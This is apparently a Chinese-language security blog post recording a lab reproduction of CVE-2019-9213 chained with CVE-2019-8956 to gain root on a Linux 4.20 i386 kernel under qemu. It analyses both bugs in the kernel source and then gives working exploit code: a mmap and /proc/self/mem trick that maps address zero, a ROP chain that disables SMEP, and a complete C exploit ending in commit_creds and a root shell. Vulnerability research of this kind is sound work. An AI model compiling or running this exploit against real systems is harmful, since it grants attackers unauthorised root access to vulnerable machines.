---
layout:     post   				    # 使用的布局（不需要改）
title:      CVE-2019-9213&CVE-2019-8956组合提权.md 		 # 标题 
subtitle:   CVE-2019-9213&CVE-2019-8956组合提权.md               # 副标题
date:       2020-01-27 				# 时间
author:     Mr.R 					# 作者
# header-img: img/post-bg-2015.jpg 	# 这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								# 标签
    - CTF
    - Pwn
---


假期中参加了XMan冬令营,学习了一些Linux Kernel相关的内容

复现了一下cve,这里记录一下。

# 环境搭建

首先准备好qemu

装好gdb插件pwndbg便于调试



选用了官网的linux-4.20 kernel源码进行编译安装

先安装好依赖

`sudo apt-get install make gcc bison flex libssl-dev libncurses-dev`

然后编译

`make i386_defconfig; make menuconfig; make`

在第二步的时候将sctp的模块支持打开,并开启debug,以便后期进行源码调试

需要注意的一点是macOS使用pd虚拟机的话尽量不要在共享目录下编译,尽量在虚拟机内解压源码包,不然会遇到许多奇奇怪怪的编译错误。

# CVE-2019-9213

首先是CVE-2019-9213，这是一个绕过0地址限制，对0地址进行映射的漏洞

首先根据观察补丁,发现漏洞点存在于`expand_downwards`函数中

新版本中删掉了

```c
	error = security_mmap_addr(address);
	if (error)
		return error;
```

跟进`security_mmap_addr`函数

最后到达

```c
int cap_mmap_addr(unsigned long addr)
{
	int ret = 0;

	if (addr < dac_mmap_min_addr) {
		ret = cap_capable(current_cred(), &init_user_ns, CAP_SYS_RAWIO,
				  SECURITY_CAP_AUDIT);
		/* set PF_SUPERPRIV if it turns out we allow the low mmap */
		if (ret == 0)
			current->flags |= PF_SUPERPRIV;
	}
	return ret;
}
```

其中![image-20200128233341916](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnm7b3hj312w01saav.jpg)

一般为4096也就是0x1000

`cap_mmap_addr`函数实际就是判断当前执行进程的cred是否有权限分配低地址

这也就导致了如果使用`su >&%d < /dev/null`之类的命令向`/proc/self/mem`中写入数据的时候,current_cred其实是root权限,可以绕过这个限制。

在linux中`su >&%d < /dev/null`这种文件操作会调用`mem_write`函数

最终在写入的地址小于**vm->start**时,如果设置了**VM_GROWSDOWN**选项的话,就会调用`expand_downwards`函数

![image-20200128234713919](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnhmuxjj31ay0ko78b.jpg)

```c
	unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	if (addr != 0x10000)
			err(2,"mmap failed");
	int fd = open("/proc/self/mem",O_RDWR);
	if (fd == -1)
			err(2,"open mem failed");
	char cmd[0x100] = {0};
	sprintf(cmd, "su >&%d < /dev/null", fd);
	while (addr)
	{
			addr -= 0x1000;
			if (lseek(fd, addr, SEEK_SET) == -1)
					err(2, "lseek failed");
			system(cmd);
	}
	printf("contents:%s\n",(char *)1);
```

于是通过这段payload,我们就可以映射到0地址

# CVE-2019-8956

流控制传输协议（Stream Control Transmission  Protocol，SCTP）是一种可靠的传输协议，它在两个端点之间提供稳定、有序的数据传递服务（非常类似于  TCP），并且可以保护数据消息边界（例如 UDP）。与 TCP 和 UDP 不同，SCTP  是通过多宿主（Multi-homing）和多流（Multi-streaming）功能提供这些收益的，这两种功能均可提高可用性。

多宿主（Multi-homing）为应用程序提供了比 TCP 更高的可用性。多宿主主机就是一台具有多个网络接口的主机，因此可以通过多个  IP 地址来访问这台主机。在 TCP 中，连接（connection）  是指两个端点之间的一个通道（在这种情况下，就是两台主机的网络接口之间的一个套接字）。SCTP  引入了“联合（association）”的概念，它也是存在于两台主机之间，但可以使用每台主机上的多个接口进行协作。





根据描述漏洞出现在`sctp_sendmsg`函数中

![image-20200129002133236](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctner5hqj312f0u045y.jpg)

`sctp_sendmsg_parse`是解析sinfo的,当标志了**SCTP_SENDALL**,且sk->type为UDP时就会依次遍历`ep->asocs`链表

asocs就是存放association连接的链表，**SCTP_SENDALL**代表向所有的association连接发送数据包。接着会进入`sctp_sendmsg_check_sflags`函数

![image-20200129002903065](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnfbdtpj310c0u0wkz.jpg)

依次检查asoc是否处于**CLOSE,ESTABLISHED,SHUTDOWN**状态

接着如果sflags中存在**SCTP_ABORT**的话，就会中止连接，通过`sctp_make_abort_user`来创建一个abort的指令，由`sctp_primitive_ABORT`发送中止。

![image-20200129003621575](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctntlbk2j30y20u07gi.jpg)

经过调试,可知这个函数实际存在于net/sctp/primitive.c的119行,调用了**DECLARE_PRIMITIVE(ABORT);**

![image-20200129003830452](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnihhqjj317a0i8td0.jpg)

进一步跟进,发现实际`sctp_primitive_XXX`都是由这个宏实现的

这里根据name设置了不同的subtype,将event_type设为了**SCTP_EVENT_T_PRIMITIVE**，接着进入`sctp_do_sm`

![image-20200129004227538](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnr5s9lj312n0u0wmr.jpg)

`sctp_do_sm`实际就是一个通过net, event_type,state,asoc来进行不同操作的状态处理函数。



此时`sctp_sm_lookup_event`中已经设置了**SCTP_EVENT_T_PRIMITIVE**

![image-20200129004417274](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctngqivaj315g0moq8m.jpg)



DO_LOOKUP实际就是根据primitive_event_table和state来返回了一个结构体

![image-20200129004536387](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctng4z4kj31a40csq55.jpg)

并调用了`state_fn->fn`这个函数,根据调试,发现他实际进入了`sctp_sf_do_9_1_prm_abort`

![image-20200129005200632](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnkiz8ij319e0m20zj.jpg)



![image-20200129005211649](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctns4xqsj310u0u0n5q.jpg)

返回了**SCTP_DISPOSITION_ABORT**状态

接着进入`sctp_side_effects`

![image-20200129010430131](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnft8tej30y2048gm9.jpg)

将asoc置0

这时候问题就来了,我当前的asoc置零,但是还在继续遍历,下一个就出现0地址解引用了。

正常情况下这个漏洞是无法进一步利用的，但还存在一个0地址映射漏洞，就可以组合拳进行提权了。

## 利用

![image-20200129002903065](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnfbdtpj310c0u0wkz.jpg)

其中asoc是0xbc,sk由asoc决定,net由sk决定,msg,msg_len均可控。

可以构造sk与asoc绕过前三个判断。

具体结构体偏移通过调试可以获得

![image-20200128161112948](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnj1j98j317g0ow46d.jpg)

![image-20200128161214969](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnp5pwbj319c0k4dll.jpg)

得到偏移

```c
struct sock{
	char padding1[0x24];
	void *net;
	char padding2[0x278];
	int type;
};


struct sctp_association{
	char padding1[0x18];
	struct sock *sk;
	char padding2[0x190];
	int state;
};
```

![image-20200128124703860](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnjwbobj30qo0bmgo6.jpg)

asoc的flags通过查看源码可以得知如上

`sri.sinfo_flags = (1 << 6) | (1 << 2);`

这样构造即可获得**SENDALL,ABORT**

跟进`sctp_make_abort_user`

![image-20200129012802437](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnlhvbbj30wy0u0q9m.jpg)

通过构造msg_len即可避免触发memcpy_from_msg

`sctp_primitive_ABORT`最终调用`sctp_do_sm`

![image-20200128163934630](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnnfgf5j316q0u0gub.jpg)

state_fn其实最终由`DO_LOOKUP`决定，而此时的state就是asoc->state,是可控的,可以将state_fn指向任意位置。![image-20200129004536387](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctng4z4kj31a40csq55.jpg)



通过查看源码,发现state_fn->fn实际就是state_fn所指向的地址，即此时劫持到了程序的流程

```c
struct sctp_sm_table_entry {
	sctp_state_fn_t *fn;
	const char *name;
};
```

我启动qemu的参数如下，开启了smep保护，没有打开kaslr

`qemu-system-i386 -hda rootfs.img -kernel bzImage -append "console=ttyS0 root=/dev/sda rw nokaslr quiet" -m 128M -nographic -s -cpu qemu32,smep`

因为打开了smep,无法直接执行用户态的代码,需要控制cr4寄存器将保护关闭,这就需要进行rop,但此时的栈是我们无法控制的。调试观察此时的寄存器状态

![image-20200129014622116](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnoggfjj31900catdi.jpg)

发现虽然寄存器不可控,但除了ebp,esp之外,寄存器所指向的地址我们都是可控的,通过ropper寻找gadget来进行栈的迁移。

`mov esp, dword ptr [ebx + eax]; add byte ptr [eax], al; add bl, byte ptr [ebx + 0x5d]; ret;`

我选择了这一条,这条gadget将栈迁移至了0x50的位置,接着我们只需要在0x50的位置构造rop就可以了

```c
	unsigned int *rop = (unsigned int *)0;
	rop[0] = 0x50;
	rop[20] = 0xc1022751; //pop eax;ret;
	rop[21] = 0x6d0;
	rop[22] = 0xc1022a69; //mov cr4, eax; push ecx; popfd; xor eax, eax; ret;
	rop[23] = 0xc1000324; //pop ebp;ret
	rop[24] = 0x4000;
	rop[25] = 0xc1022751; //pop eax;ret;
	rop[26] = 0xc71a5be0;
	rop[27] = 0xc124efdd; //mov esp, eax; call dword ptr [ebp - 0x77];
	unsigned int *tmp = (unsigned int *)(0x4000-0x77);
	tmp[0] = &get;
```

这里遇到了一个问题,当我把esp设置在映射出来的空间的时候

`commit_creds(prepare_kernel_cred(0));`

会报错,当我设置为内核中的栈地址的时候就可以正常执行

最后完整的exp如下,根据https://github.com/butterflyhack/CVE-2019-8956 改写

![image-20200129020020328](https://tva1.sinaimg.cn/large/006tNbRwgy1gbctnq6m0tj30s20gqjt1.jpg)

```c
#define _GNU_SOURE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <error.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/sctp.h>
#include <netinet/in.h>
#include <time.h> 
#include <malloc.h>
#include <sys/mman.h>
#include <err.h>
#include <signal.h>

#define SERVER_PORT 6666

#define SCTP_GET_ASSOC_ID_LIST	29
#define SCTP_RESET_ASSOC	120
#define SCTP_ENABLE_RESET_ASSOC_REQ	0x02
#define SCTP_ENABLE_STREAM_RESET	118

unsigned int user_cs, user_ss, user_rflags, user_sp;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1074a20;
void (*commit_creds)(void*) KERNCALL = (void*) 0xc1074670;

struct sock{
	char padding1[0x24];
	void *net;
	char padding2[0x278];
	int type;
};


struct sctp_association{
	char padding1[0x18];
	struct sock *sk;
	char padding2[0x190];
	int state;
};


void save_status()
{
    asm("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %esp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get(){

    commit_creds(prepare_kernel_cred(0));
	asm(
		"pushl user_ss;"
		"pushl user_sp;"
		"pushl user_rflags;"
		"pushl user_cs;"
		"push $shell;"
		"iret;");
}

void shell(){
    system("/bin/sh");
    printf("getshell!");
}

void* client_func(void* arg)
{
	int socket_fd;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;
	struct sctp_sndrcvinfo sri;
	int s;

	char sendline[] = "butterfly";

	if ((socket_fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP))==-1){
		perror("client socket");
		pthread_exit(0);
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(socket_fd,IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_))==-1){
		perror("client setsockopt");
		goto client_out_;
	}

	sri.sinfo_ppid = 0;
	sri.sinfo_flags = 0;
	printf("sctp_sendmsg\n");
	if(sctp_sendmsg(socket_fd,sendline,sizeof(sendline),
		(struct sockaddr*)&serverAddr,sizeof(serverAddr),
		sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream,0,0)==-1){
		perror("client sctp_sendmsg");
		goto client_out_;
	}

client_out_:
  	//close(socket_fd);
	pthread_exit(0);
}

void* send_recv(void* arg)
{
	int server_sockfd, msg_flags;
	server_sockfd = *(int*)arg;
	socklen_t len = sizeof(struct sockaddr_in);
	size_t rd_sz;
	char readbuf[20]="0";
	struct sctp_sndrcvinfo sri;
	struct sockaddr_in clientAddr;
	
	rd_sz = sctp_recvmsg(server_sockfd,readbuf,sizeof(readbuf),
	(struct sockaddr*)&clientAddr, &len, &sri, &msg_flags);
	
	sri.sinfo_flags = (1 << 6) | (1 << 2);
	printf("SENDALL.\n");
	if(sctp_sendmsg(server_sockfd,readbuf,0,(struct sockaddr*)&clientAddr,
		len,sri.sinfo_ppid,sri.sinfo_flags,sri.sinfo_stream, 0,0)<0){
		perror("SENDALL sendmsg");
	}
	pthread_exit(0);
}

void setpayload(){
	unsigned long addr = (unsigned long)mmap((void *)0x10000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
	if (addr != 0x10000)
			err(2,"mmap failed");
	int fd = open("/proc/self/mem",O_RDWR);
	if (fd == -1)
			err(2,"open mem failed");
	char cmd[0x100] = {0};
	sprintf(cmd, "su >&%d < /dev/null", fd);
	while (addr)
	{
			addr -= 0x1000;
			if (lseek(fd, addr, SEEK_SET) == -1)
					err(2, "lseek failed");
			system(cmd);
	}
	printf("contents:%s\n",(char *)1);
    
	struct sctp_association *asoc = (struct sctp_association *)0xbc;
	asoc->sk = (struct sock *)0x1000;
	asoc->sk->type = 1;
	asoc->state = 0x7caf02c;
	unsigned int* call = (unsigned int *)0x3000;
	call[0] = 0xc1743d8f;	//mov esp, dword ptr [ebx + eax]; add byte ptr [eax], al; add bl, byte ptr [ebx + 0x5d]; ret;
	unsigned int *rop = (unsigned int *)0;
	rop[0] = 0x50;
	rop[20] = 0xc1022751; //pop eax;ret;
	rop[21] = 0x6d0;
	rop[22] = 0xc1022a69; //mov cr4, eax; push ecx; popfd; xor eax, eax; ret;
	rop[23] = 0xc1000324; //pop ebp;ret
	rop[24] = 0x4000;
	rop[25] = 0xc1022751; //pop eax;ret;
	rop[26] = 0xc71a5be0;
	rop[27] = 0xc124efdd; //mov esp, eax; call dword ptr [ebp - 0x77];
	unsigned int *tmp = (unsigned int *)(0x4000-0x77);
	tmp[0] = &get;

}


int main(int argc, char** argv)
{
	save_status();
	int server_sockfd;
	//int messageFlags_;
	pthread_t thread_array[2];
	pthread_t close_thread;
	pthread_t send_recv_thread;
	int i;
	struct sockaddr_in serverAddr;
	struct sctp_event_subscribe event_;
	setpayload();
	//创建服务端SCTP套接字
	if ((server_sockfd = socket(AF_INET,SOCK_SEQPACKET,IPPROTO_SCTP))==-1){
		perror("socket");
		return 0;
	}
	bzero(&serverAddr, sizeof(serverAddr));
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddr.sin_port = htons(SERVER_PORT);
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	//地址绑定
	if(bind(server_sockfd, (struct sockaddr*)&serverAddr,sizeof(serverAddr)) == -1){
		perror("bind");
		goto out_;
	}

	//设置SCTP通知事件
	bzero(&event_, sizeof(event_));
	event_.sctp_data_io_event = 1;
	if(setsockopt(server_sockfd, IPPROTO_SCTP,SCTP_EVENTS,&event_,sizeof(event_)) == -1){
		perror("setsockopt");
		goto out_;
	}

	//开始监听
	listen(server_sockfd,100);
	//创建线程，用于客户端链接
	for(i=0; i<2;i++) {
		printf("create no.%d\n",i+1);
		if(pthread_create(&thread_array[i],NULL,client_func,NULL)){
			perror("pthread_create");
			goto out_;
		}
	}
	//创建接收线程
	if(pthread_create(&send_recv_thread,NULL,send_recv,(void*)&server_sockfd)){
			perror("pthread_create");
			goto out_;
	}
	while(1);
out_:
	close(server_sockfd);
	return 0;
}
```



